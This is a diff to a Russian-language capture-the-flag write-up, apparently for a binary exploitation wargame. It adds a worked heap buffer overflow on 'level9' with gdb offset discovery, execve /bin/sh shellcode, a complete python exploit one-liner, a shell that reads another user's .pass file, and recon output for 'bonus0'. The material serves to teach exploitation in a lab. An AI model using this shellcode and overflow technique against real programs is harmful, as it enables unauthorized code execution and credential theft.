@@ -943,9 +943,10 @@ ___
 
 Адрес кучи `0x804a008` .
 
-Узнаю смещение адреса возврата функции. Добиваю буфер до нужного размера переполнения (shellcode + NOP-срезы) + адрес кучи.
+Узнаю смещение адреса возврата функции, [воспользовавшись сайтом](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) . Добиваю буфер до нужного размера переполнения (shellcode + NOP-срезы) + адрес кучи.
 
 ![Смещение:](./README/level2_buf_overflow.png)
+Нужное смещение 80 байт.
 
 В этом задании я буду использовать тот же shellcode, что и на предыдущем уровне ([shellcode из level1](#shellcode)).
 
@@ -3579,26 +3580,25 @@ ltrace ./level9 AAAA BBBB
 
 ```sh
 gdb level9
-(gdb) disassemble #Tab
+
+(gdb) info functions
 # ||
 # \/
-# класс N (_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3):    
-typeinfo for N
-typeinfo name for N
-vtable for N   
-N::N(int)
-N::operator+(N&)
-N::operator-(N&)
-N::setAnnotation(char*)
-__static_initialization_and_destruction_0(int, int)
-#
-#
-main
-_exit
-operator new(unsigned int) #_Znwj@plt new для класса N  
-#
-memcpy
-strlen
+# ...
+# 0x080485f4  main
+# 0x080484f0  _exit
+# 0x08048530  operator new(unsigned int)
+# ...
+# 0x08048510  memcpy
+# 0x08048520  strlen
+# ...
+# 0x080486f6  N::N(int)
+# 0x080486f6  N::N(int)
+# 0x0804870e  N::setAnnotation(char*)
+# 0x0804873a  N::operator+(N&)
+# 0x0804874e  N::operator-(N&)
+# 0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+# 0x08048500  _ZNSt8ios_base4InitD1Ev
 
 ```
 ---
@@ -3755,8 +3755,8 @@ char N_буфер[какого-то размера]; // смотреть ниж�
 0x08048688 <+148>:   mov    %eax,0x4(%esp)  # экземпляр_N5 передан 2м аргументом
 # 
 # 6.3. Получение данных из экземпляр_N5
-0x0804868c <+152>:   mov    0x10(%esp),%eax  # адрес 0x804a078 экземпляр_N6 помещен в eax
-0x08048690 <+156>:   mov    %eax,(%esp)      # экземпляр_N6 передан 1м аргументом
+0x0804868c <+152>:   mov    0x10(%esp),%eax # адрес 0x804a078 экземпляр_N6 помещен в eax
+0x08048690 <+156>:   mov    %eax,(%esp)     # экземпляр_N6 передан 1м аргументом
 # 
 # 6.4. Вызов функции N::operator+(N&) ():
 0x08048693 <+159>:   call   *%edx
@@ -3858,6 +3858,69 @@ End of assembler dump.
 Как видно из анализа выше, уязвимость в `memcpy()`: \
 в `main()` вызвана `N::setAnnotation(char*)`, внутри которой `memcpy(N_буфер, argv[1], strlen(argv[1]))` и нет проверки на переполнение `N_буфер` от `argv[1]`.
 
+В то же время в программе нет функции, вызывающей оболочку, значит буду использовать shellcode.
+
+Уязвимость:
+1. Использование `memcpy()` без проверки допустимой длины для копирования.
+
+Атака:
+1. Переполнение буфера и расчет смещения.
+2. Выбор для исполнения в буфере shellcode.
+3. Подстановке шеллкода и нужных адресов в переполненный буфер.
+
+Атакую:
+
+1. Расчет смещения EIP (адреса возврата) \
+[Воспользуюсь сайтом.](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+
+```sh
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+# ||
+# \/
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x08048682 in main ()
+(gdb) x $eax
+# ||
+# \/
+# 0x41366441:     Cannot access memory at address 0x41366441
+```
+![Получается так:](./README/level9_buf_overflow.png)
+Нужное смещение 108 байт.
+
+2. Использую [shellcode, что и в предыдущих заданиях](#2-level1-shellcode-на-стеке): \
+`"\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"`. Шеллкод занимает 32 байта.
+
+3. Адрес буфера \
+В программе происходит вызов `экземпляр_N5.setAnnotation(argv[1]);`.\
+Адрес `экземпляр_N5` 0x804a078. \
+Выше в пункте 2 анализа disassemble (*экземпляр_N5).setAnnotation(argv[1]) видно адрес буфера экземпляра класса: 0x804a00c .
+
+Этот адрес будет стоять в конце строки с атакой, чтобы подменить им вызов  `operator+(N&)` (`0x08048693 <+159>:   call   *%edx` - пункт 6.4. disassemble main() ).
+
+А также из анализа main() видно, что `*%edx` (есть `*`), значит при переходе по этому адресу надо будет вновь пройти по адресу на который попаду, только потом в буфере будут выполняться последовательно инструкции (`call`).
+
+Итоговая атака выглядит так: \
+`адрес кучи` + `шеллкод` + `мусор или \x90` + `адрес кучи`
+
+Атакую:
+```sh
+./level9 $(python -c 'print "\x0c\xa0\04\x08" + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1" + "A" * 72 + "\x0c\xa0\04\x08"')
+
+whoami
+# || 
+# \/
+# bonus0
+cat /home/user/bonus0/.pass
+# || 
+# \/
+# f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+Уровень пройден!
+```sh
+su bonus0
+# Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
 <br><br>
 
 <details> 
@@ -3915,42 +3978,133 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 <font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/bonus0/bonus0</font>
 </pre> -->
 
-<!-- ![bonus0](./README/bonus0.png) -->
+![bonus0](./README/bonus0.png)
 
-<!-- Проверяю содержимое домашней директории пользователя и свойства содержимого: 
+Проверяю содержимое домашней директории пользователя и свойства содержимого: 
 <details><summary> ls -la </summary>
 
 ```sh
+ls -la
+# ||
+# \/
+# ...
+# -rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
 ```
 ---
 </details>
-<details><summary> getfacl level8 </summary>
+<details><summary> getfacl bonus0 </summary>
 
 ```sh
+getfacl bonus0
+# ||
+# \/
+# # file: bonus0
+# # owner: bonus1
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:bonus0:r-x
+# user:bonus1:r-x
+# group::---
+# mask::r-x
+# other::---
 ```
 ---
 
 </details>
-<details><summary> ./level8 </summary>
+<details><summary> ./bonus0 </summary>
 
 ```sh
+./bonus0
+# ||
+# \/
+#  - 
+# 
+#  - 
+# 
+# 
+
+./bonus0 AAAA
+# ||
+# \/
+#  - 
+# 
+#  - 
+# 
+#  
+
+./bonus0
+# ||
+# \/
+#  - 
+# AAAA
+#  - 
+# AAAA
+# ||
+# \/
+# AAAA AAAA
+
 ```
 ---
 
 </details>
-<details><summary> ltrace ./level8 </summary>
+<details><summary> ltrace ./bonus0 </summary>
 
 ```sh
+ltrace ./bonus0
+# __libc_start_main(0x80485a4, 1, 0xbffff6f4, 0x80485d0, 0x8048640 <unfinished ...>
+# puts(" - " - 
+# )                                                          = 4
+# read(0, AAAA
+# "AAAA\n", 4096)                                              = 5
+# strchr("AAAA\n", '\n')                                               = "\n"
+# strncpy(0xbffff5d8, "AAAA", 20)                                      = 0xbffff5d8
+# puts(" - " - 
+# )                                                          = 4
+# read(0, BBBB
+# "BBBB\n", 4096)                                              = 5
+# strchr("BBBB\n", '\n')                                               = "\n"
+# strncpy(0xbffff5ec, "BBBB", 20)                                      = 0xbffff5ec
+# strcpy(0xbffff626, "AAAA")                                           = 0xbffff626
+# strcat("AAAA ", "BBBB")                                              = "AAAA BBBB"
+# puts("AAAA BBBB"AAAA BBBB
+# )                                                    = 10
+# +++ exited (status 0) +++
 ```
 ---
 
 </details>
-<details><summary> gdb level8 -> disassemble на список функций </summary>
+<details><summary> gdb bonus0 -> info functions </summary>
 
 ```sh
+gdb bonus0
+(gdb) info functions
+# ||
+# \/
+# Non-debugging symbols:
+# 0x08048334  _init
+# 0x08048380  read
+# 0x08048390  strcat
+# 0x080483a0  strcpy
+# 0x080483b0  puts
+# 0x080483c0  __gmon_start__
+# 0x080483d0  strchr
+# 0x080483e0  __libc_start_main
+# 0x080483f0  strncpy
+# 0x08048400  _start
+# 0x08048430  __do_global_dtors_aux
+# 0x08048490  frame_dummy
+# 0x080484b4  p
+# 0x0804851e  pp
+# 0x080485a4  main
+# 0x080485d0  __libc_csu_init
+# 0x08048640  __libc_csu_fini
+# 0x08048642  __i686.get_pc_thunk.bx
+# 0x08048650  __do_global_ctors_aux
+# 0x0804867c  _fini
 ```
 ---
-</details> -->
+</details>
 
 <!-- <details> 
   <summary>  </summary>
@@ -4305,5 +4459,4 @@ gcc -m32 -fno-stack-protector -Wl,-z,norelro исходник_level.c -o level
 
 Уязвимость Use-After-Free
 https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
-
 
